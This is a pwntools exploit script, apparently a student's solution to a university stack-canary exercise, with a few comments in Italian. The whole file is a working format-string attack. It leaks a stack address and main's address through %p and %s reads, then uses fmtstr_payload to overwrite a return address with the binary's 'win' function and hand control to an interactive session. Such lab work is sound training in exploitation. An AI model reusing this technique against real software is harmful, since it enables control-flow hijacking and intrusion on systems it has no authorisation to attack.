#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canary2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'canary1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4411)
    else:
        return remote('localhost', 4411)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments


# find an address in the stack
# for i in range(100):
#     io = start()
#     payload = f"%{i+1}$p".encode()

#     io.sendline(payload)
#     x = io.recv()

#     if b'0x7ff' not in x:
#         io.close()
#         continue
    
#     print(i+1, x)  
#     io.close()
      

# leak the stack
io = start()
payload = f"%36$p".encode()
io.sendline(payload)
stack_leak = io.recv()
io.close()

# primo è %(rsp) e il secondo è quello leakato
# p/x 0x7fff9b313ff8 - 0x7fff9b313e98 = 0x160

stack_leak = int(stack_leak, 16) - 0x160

# leak the main address
io = start()
payload = f"%7$sAAAA".encode() + p64(stack_leak)
io.sendline(payload)
main_address = io.recv().split(b"AAAA")[0]
io.close()

main_address = main_address.ljust(8,b'\x00')

# disass main and get the idx after the child's return (now this is wrong cause the file is nopie)
# main+529 is the ret addr of child
exe.address = u64(main_address) - (exe.sym['main']+529)

# same as c1sploit.got altrimenti dovevi brutare anche l'indice della fmtstring
i = 6
p_win = exe.sym['win']

io = start()

payload = fmtstr_payload(
    i, 
    {stack_leak : p_win}, 
    write_size='byte'
)

io.sendline(payload)

io.interactive()
